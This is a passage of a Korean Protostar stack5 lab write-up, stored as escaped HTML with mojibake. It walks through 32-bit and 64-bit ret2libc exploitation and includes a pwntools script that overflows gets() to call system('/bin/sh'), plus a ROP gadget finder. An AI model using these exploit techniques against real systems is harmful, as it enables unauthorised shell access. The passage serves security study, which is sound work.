&lt;h3 id=&quot;133-ìµìŠ¤í”Œë¡œì‡-ìƒì„±&quot;&gt;1.3.3. ìµìŠ¤í”Œë¡œì‡ ìƒì„±&lt;/h3&gt;

&lt;p&gt;ì´ì œê¹Œì§€ ì•Œì•„ë‚¸ ì •ë³´ë¥¼ ì·¨í•©í•˜ë©´ í˜ì´ë¡œë“œì˜ êµ¬ì¡°ë¥¼ ì•„ë˜ì™€ ê°™ì´ ì§€ì •í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7e1b3d0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7f5c1db&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•˜ì§€ë§Œ ì—¬ê¸°ì— í•¨ì •ì´ ìˆë‹¤. ì´ˆë°˜ì— ì„¤ëª…í–ˆë˜ ì»´íŒŒì¼ ì˜µì…˜ ë•Œë¬¸ì´ë‹¤. ì»´íŒŒì¼ ì‹œ ë‚˜ëŠ” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary=4&lt;/code&gt; ë¡œ ì¤¬ë‹¤. ì›ë˜ëŠ” 64bitë¡œ ì»´íŒŒì¼ í•˜ë ¤ë‹¤ê°€ ê¸‰í•˜ê²Œ 32bitë¡œ ë°©í–¥ì„ ë°”ê¾¸ëŠ” ë°”ëŒì— ê°’ì„ 2ë¡œ ë°”ê¾¸ëŠ” ê±¸ ê¹œë¹¡í–ˆë‹¤!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary&lt;/code&gt; ëŠ” ìŠ¤íƒì„ ì •ë¦¬í•´ ì£¼ê³ , ì£¼ì–´ì§„ ê°’ì„ nì´ë¼ í•  ë•Œ 2^nì˜ ë°°ìˆ˜ë¡œ ìŠ¤íƒ í”„ë ˆì„ì˜ ë°”ë‹¥ì´ ì§€ì •ë˜ë„ë¡ aligní•´ì£¼ëŠ” ì˜µì…˜ì´ë‹¤. 32 bit ì»´íŒŒì¼ ì‹œì—ëŠ” ê°’ì„ 2ë¡œ ì¤˜ì•¼ 4ì˜ ë°°ìˆ˜ë¡œ ìŠ¤íƒ í”„ë ˆì„ì˜ ë°”ë‹¥ì´ ì •ë¦¬ë˜ê¸° ë•Œë¬¸ì— í¸í•˜ê³ , 64bit ì»´íŒŒì¼ ì‹œì—ëŠ” ê°’ì„ 4ë¡œ ì¤˜ì•¼ 16ì˜ ë°°ìˆ˜ë¡œ ìŠ¤íƒ í”„ë ˆì„ì˜ ë°”ë‹¥ì´ ì˜¤ë©´ì„œ ìŠ¤íƒì´ ì •ë¦¬ë˜ê¸° ë•Œë¬¸ì— í¸í•œë°â€¦ ë‚˜ëŠ” 32bitë¡œ ì»´íŒŒì¼í•˜ë©´ì„œ ê°’ì„ 4ë¡œ ì¤¬ë‹¤. ê·¸ë˜ì„œ í•¨ìˆ˜ì˜ ì—í•„ë¡œê·¸ê°€ ë³€í•˜ëŠ” ë°”ëŒì— ìê¾¸ë§Œ í˜ì´ë¡œë“œê°€ ë¨¹íˆì§€ ì•Šì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;32 bitë¡œ ì»´íŒŒì¼í•˜ë©´ì„œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary&lt;/code&gt; ë¥¼ ì œëŒ€ë¡œ ì„¤ì •í•˜ì§€ ì•Šìœ¼ë©´ ì•„ë˜ì™€ ê°™ì€ ì—í•„ë¡œê·¸ê°€ ë‚˜ì˜¨ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì•„ë¬´ë˜ë„ í•´ë‹¹ ì˜µì…˜ì˜ ë””í´íŠ¸ ê°’ì´ 4ë¼ì„œ 16ì˜ ë°°ìˆ˜ë¡œ ìŠ¤íƒ í”„ë ˆì„ì˜ ê¼­ëŒ€ê¸°ê°€ ëë‚˜ëŠ” ìƒí™©ì¸ì§€ë¼, í•„ìš”í•œ ê²ƒë³´ë‹¤ ë” í• ë‹¹ëœ ìŠ¤íƒì„ ì •ë¦¬í•˜ê¸° ìœ„í•´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea esp,[ecx-0x4]&lt;/code&gt; ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì¶”ê°€ë˜ì–´ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì˜µì…˜ì„ ì œëŒ€ë¡œ ì£¼ë©´ í•´ë‹¹ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì´ ì—†ëŠ” í´ë˜ì‹í•œ ì—í•„ë¡œê·¸ë¥¼ ë³¼ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì¶”ê°€ë¡œ ë§í•˜ìë©´, ìœ„ì™€ ê°™ì€ ìƒí™©ì¼ ë•Œ í•¨ìˆ˜ì˜ í”„ë¡¤ë¡œê·¸ë„ ìƒˆë¡œìš´ í˜•ì‹ì´ ë˜ì–´ ë‚˜íƒ€ë‚œë‹¤. ì• ì´ˆì— 16ì˜ ë°°ìˆ˜ë¡œ ìŠ¤íƒ ì‹œì‘ì ì„ aligní•  í•„ìš”ê°€ ì—†ëŠ” 32bit í”„ë¡œê·¸ë¨ì´ë‹¤ ë³´ë‹ˆ ì–µì§€ë¡œ ebp ì£¼ì†Œë¥¼ 16ì˜ ë°°ìˆ˜ë¡œ ë§ì¶”ê¸° ìœ„í•´ ì•„ë˜ì™€ ê°™ì€ í”„ë¡¤ë¡œê·¸ê°€ ë³´ì¸ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xfffffff0&lt;/code&gt; ê³¼ and ì—°ì‚°ì„ í•¨ìœ¼ë¡œì¨ ë¬´ì¡°ê±´ 16ì˜ ë°°ìˆ˜ë¡œ ë§Œë“  espë¥¼ ebpì— ë„£ì–´ì„œ ìŠ¤íƒì˜ ë°”ë‹¥ì„ ì§€ì •í•˜ëŠ” ë¶€ë¶„ì´ ë³´ì¸ë‹¤.&lt;/p&gt;

&lt;p&gt;ë‹¤ì‹œ í•µì‹¬ìœ¼ë¡œ ëŒì•„ì™€, ëŒ€ìƒ íŒŒì¼ì„ ì»´íŒŒì¼í•´ ì•ì˜ ê³¼ì •ì„ ë‹¤ì‹œ ë°Ÿì€ ì´í›„ í˜ì´ë¡œë“œë¥¼ ì§€ì •í•œë‹¤ë©´ ì•„ë˜ì²˜ëŸ¼ ì‰˜ì„ ë”¸ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë¬¼ë¡  ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•´ ìµìŠ¤í”Œë¡œì‡ì„ ìˆ˜í–‰í•  ìˆ˜ë„ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# stack5_32_exploit.py
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_32&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;system_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7e1b3d0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ret_corrupt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;str_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf7f5c1db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x44&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_add&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret_corrupt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str_add&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;2-x86-64-ê¸°ë°˜ì—ì„œ-rtl-ìˆ˜í–‰í•˜ê¸°&quot;&gt;2. X86-64 ê¸°ë°˜ì—ì„œ RTL ìˆ˜í–‰í•˜ê¸°&lt;/h1&gt;

&lt;p&gt;ì•ì„œ ìµìŠ¤í”Œë¡œì‡ì˜ ì„¸ ë‹¨ê³„ ì¤‘ ë‘ ë‹¨ê³„ë¥¼ ëëƒˆê¸° ë•Œë¬¸ì— ì´ ì ˆì—ì„œëŠ” ë§ˆì§€ë§‰ ë‹¨ê³„ì— ëŒ€í•´ì„œë§Œ ì„œìˆ í•œë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ëŒ€ìƒ í”„ë¡œê·¸ë¨ ë¶„ì„í•´ ì·¨ì•½ì  ì§€ì •&lt;/li&gt;
  &lt;li&gt;í•´ë‹¹ ì·¨ì•½ì ì„ ìµìŠ¤í”Œë¡œì‡í•  ë°©ë²• ì§€ì •&lt;/li&gt;
  &lt;li&gt;ìµìŠ¤í”Œë¡œì‡ ìƒì„±&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;21-í˜ì´ë¡œë“œê°€-ì™œ-ì´-ëª¨ì–‘ì´ì•¼&quot;&gt;2.1. í˜ì´ë¡œë“œê°€ ì™œ ì´ ëª¨ì–‘ì´ì•¼?&lt;/h2&gt;

&lt;p&gt;64ë¹„íŠ¸ë¡œ ì»´íŒŒì¼ëœ í”„ë¡œê·¸ë¨ì— RTLì„ í•˜ë ¤ë©´ ì•„ë˜ì™€ ê°™ì€ í˜ì´ë¡œë“œë¥¼ ë„£ì–´ì•¼ í•œë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset bytes + Gadget address(pop rdi;ret;) + parameter address + Library function address
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ëŒ€ì²´ ì™œ ê·¸ëŸ° ê±°ì§€ ì‹¶ë‹¤. ì´ìœ ëŠ” ì •ë§ ê°„ë‹¨í•œë°, ì•ì„œ ì„¤ëª…í–ˆë˜ Cdecl ê·œì •, í•¨ìˆ˜ì˜ Calling Convention ë•Œë¬¸ì´ë‹¤. x86-64ì—ì„œëŠ” í•¨ìˆ˜ì˜ ì²« íŒŒë¼ë¯¸í„° 6ê°œê°€ rdi, rsi, rdx, rcx, r8, r9ì— ìˆœì„œëŒ€ë¡œ ë“¤ì–´ê°€ê³ , ê·¸ëŸ¬ê³ ë„ íŒŒë¼ë¯¸í„°ê°€ ë‚¨ëŠ”ë‹¤ë©´ ë’¤ì—ì„œë¶€í„° ìŠ¤íƒì— ë“¤ì–´ê°„ë‹¤ëŠ” ê²ƒì„ ê¼­ ê¸°ì–µí•˜ì.&lt;/p&gt;

&lt;p&gt;ìš°ë¦¬ëŠ” system() í•¨ìˆ˜ì— â€œ/bin/shâ€ ë¬¸ìì—´ì˜ ì£¼ì†Œë¥¼ ì²« ë²ˆì§¸ì´ì ë§ˆì§€ë§‰ ì¸ìë¡œ ì „ë‹¬í•˜ëŠ” ê²ƒì´ ëª©ì ì´ë‹¤. ì¦‰, â€œ/bin/shâ€ì˜ ì£¼ì†Œë¥¼ rdiì— ì €ì¥í•´ì•¼ë§Œ í•œë‹¤. ê·¸ë ‡ê²Œ í•˜ê¸° ìœ„í•´&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ìŠ¤íƒ í”„ë ˆì„ì˜ ret addì— ë©”ëª¨ë¦¬ì— ì ì¬ëœ ìˆ˜ë§ì€ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì¤‘ ì–´ë”˜ê°€ì— ìˆì„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret&lt;/code&gt; ì˜ ì£¼ì†Œë¥¼ ë„£ê³ &lt;/li&gt;
  &lt;li&gt;í•´ë‹¹ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì¤‘ ì²« ë²ˆì§¸ë¡œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt; ê°€ ì‹¤í–‰ëœë‹¤ë©´ rspê°€ ìœ„ì¹˜í•œ ê³³, ì¦‰ í˜„ì¬ ret addressì˜ ë°”ë¡œ ì•„ë˜ ìœ„ì¹˜ê°€ rdiì— ë‹´ê¸°ê³  rspê°€ í•œ ì£¼ì†Œ ì•„ë˜ë¡œ ë‚´ë ¤ê°€ê²Œ ë  ê²ƒì„ ì´ìš©í•œë‹¤.&lt;/li&gt;
  &lt;li&gt;ì§í›„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; ê°€ ì‹¤í–‰ë  ê²ƒ, ì¦‰ í˜„ì¬ ìœ„ì¹˜í•œ rspê°€ ê°€ë¦¬í‚¤ëŠ” ìŠ¤íƒ ìœ„ì¹˜ì— ë‹´ê¸´ ì£¼ì†Œê°€ ripì— ë‹´ê²¨ ì´ë‹¤ìŒì— ì‹¤í–‰ë  ê²ƒì„ ì´ìš©í•œë‹¤.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ì´ëŸ¬í•œ íë¦„ì„ ì„±ê³µì‹œí‚¤ê¸° ìœ„í•´ í˜ì´ë¡œë“œëŠ” ìœ„ì™€ ê°™ì€ í˜•íƒœê°€ ëœë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ ì‹œì ì—ì„œ ì•Œì•„ë‚´ì•¼ í•˜ëŠ” ì •ë³´ëŠ” 4ê°œë¡œ ì¢í˜€ì§„ë‹¤.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Offset byteì˜ í¬ê¸°&lt;/li&gt;
  &lt;li&gt;Gadgetì˜ ì£¼ì†Œ&lt;/li&gt;
  &lt;li&gt;â€œ/bin/shâ€ì˜ ì£¼ì†Œ&lt;/li&gt;
  &lt;li&gt;systemì˜ ì£¼ì†Œ&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;22-ìµìŠ¤í”Œë¡œì‡-ìƒì„±&quot;&gt;2.2. ìµìŠ¤í”Œë¡œì‡ ìƒì„±&lt;/h2&gt;

&lt;h3 id=&quot;221-offset-byteì˜-í¬ê¸°-ì•Œê¸°&quot;&gt;2.2.1. Offset Byteì˜ í¬ê¸° ì•Œê¸°&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt; ëª…ë ¹ì–´ë¥¼ ì´ìš©í•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;getsì— ë“¤ì–´ê°€ëŠ” ì²« ë²ˆì§¸ ì¸ìë¥¼ ì €ì¥í•˜ëŠ” rdiì— ë“¤ì–´ê°€ëŠ” ê°’ì„ í™•ì¸í•´ ë³´ë©´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x40&lt;/code&gt; ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤. ì¦‰, rbpê¹Œì§€ë¥¼ ì˜¤ì—¼ì‹œí‚¤ê¸° ìœ„í•´ 0x48 bytesê°€ í•„ìš”í•¨ì„ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;offset byte = 0x48 bytes&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;222-gadgetì˜-ì£¼ì†Œ-ì•Œê¸°&quot;&gt;2.2.2. Gadgetì˜ ì£¼ì†Œ ì•Œê¸°&lt;/h3&gt;

&lt;p&gt;ëª©í‘œí•˜ëŠ” gadgetì€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret;&lt;/code&gt; ì´ë‹¤. ì´ë¥¼ ì°¾ê¸° ìœ„í•´ pwntoolsë¥¼ ì´ìš©í•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;íƒ€ê²Ÿ í”„ë¡œê·¸ë¨ì€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/code&gt; ì„ ì‚¬ìš©í•˜ê³  ìˆìŒì„ í™•ì¸í–ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë”°ë¼ì„œ ê°€ì ¯ì„ ì°¾ì•„ì˜¤ëŠ” ìŠ¤í¬ë¦½íŠ¸ëŠ” ì•„ë˜ì™€ ê°™ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;gadget(ret rdi;ret;) = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh=&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ê²°ê³¼ëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì•ì„œ ì•Œì•„ë‘” ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‹œì‘ ì£¼ì†Œê°€ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7a0364f&lt;/code&gt; ì´ê³ , ê°€ì ¯ì˜ ì˜¤í”„ì…‹ì´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2164f&lt;/code&gt; ì´ë¯€ë¡œ ë‘˜ì„ ë”í•œ ê²°ê³¼ê°’ì¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7ffff7a0364f&lt;/code&gt; ì— ì •ë§ë¡œ ê°€ì ¯ì´ ì ì¬ë˜ì–´ ìˆëŠ”ì§€ gdbë¡œ í™•ì¸í•´ ë³´ì.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì ì¬ë˜ì–´ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gadget address = 0x7ffff7a0364f&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;223-binshê³¼-systemì˜-ì£¼ì†Œ-ì•Œê¸°&quot;&gt;2.2.3. â€œ/bin/shâ€ê³¼ systemì˜ ì£¼ì†Œ ì•Œê¸°&lt;/h3&gt;

&lt;p&gt;ìœ„ì—ì„œ ê°€ì ¯ì˜ ìœ„ì¹˜ë¥¼ ì•Œì•„ë‚´ê¸° ìœ„í•œ ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ì´ë¯¸ ì•Œì•„ëƒˆê¸° ë•Œë¬¸ì— ê°’ë§Œ ì“°ê³  ìƒëµí•œë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;System offset = 0x4f420&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh offset = 0x1b3d88&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ì¼ì¼ì´ ë”í•˜ê³  ì‹¶ì§€ ì•Šê¸° ë•Œë¬¸ì— ê³„ì‚°ì€ ìŠ¤í¬ë¦½íŠ¸ì—ê²Œ ë§¡ê²¨ì•¼ê² ë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;224-ìµìŠ¤í”Œë¡œì‡-ìƒì„±&quot;&gt;2.2.4. ìµìŠ¤í”Œë¡œì‡ ìƒì„±&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;ğŸ¤©: ì¢‹ì•„ ì´ì œ ìŠ¤í¬ë¦½íŠ¸ë§Œ ì‹¤í–‰í•˜ë©´ ëì´ë‹¤!&lt;/p&gt;

  &lt;p&gt;ğŸ¤¨: ì•„ë‹ˆ ê·¸ëŸ°ë° ì™œ ì•ˆë¼&lt;/p&gt;

  &lt;p&gt;ğŸ¤¯: ì•„ SEGFAULTë‹¤&lt;/p&gt;

  &lt;p&gt;ğŸ’©: í•˜â€¦.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;ì´ëŸ´ ë• ë‹¹í™©í•˜ì§€ ë§ê³  ì¹¨ì°©í•˜ê²Œ íŠ¸ëŸ¬ë¸”ìŠˆíŒ…ì„ ì‹œì‘í•˜ë©´ ëœë‹¤. ë¬¼ë¡  ë‚˜ëŠ” ë„ˆë¬´ ë‹¹í™©í•´ì„œ ì°”ë” ìš¸ê¸´ í–ˆëŠ”ë°&lt;/p&gt;

